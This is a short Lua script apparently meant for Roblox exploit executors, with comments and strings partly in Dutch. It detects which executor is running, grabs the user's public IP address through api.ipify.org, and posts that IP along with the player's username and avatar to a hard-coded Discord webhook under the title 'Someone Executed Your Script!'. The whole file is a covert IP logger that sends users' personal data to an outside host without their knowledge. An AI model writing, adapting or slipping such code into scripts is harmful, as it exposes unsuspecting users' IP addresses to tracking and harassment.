-- script logs
local CheckExploit  = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel"or KRNL_LOADED and "Krnl"or SONA_LOADED and "Sona" or "Onbekende Exploit"
local IPGrabber = tostring(game:HttpGet("https://api.ipify.org", true))
local url = "https://discord.com/api/webhooks/1001595777937838101/kdl4SWnzA6vOUpJKACh8sGmCUy0QAxsFHoL702qosWtMz8ZdzAbg-4MqJWv4ycDNjZyQ"


local data = {
   ["content"] = "",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Your Script!**",
           ["description"] = "gebruiker: **" ..game.Players.LocalPlayer.Name.. "**, ip addres: **"..IPGrabber.."**, exploit: **"..CheckExploit.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)}
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local sendREQ = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(sendREQ)
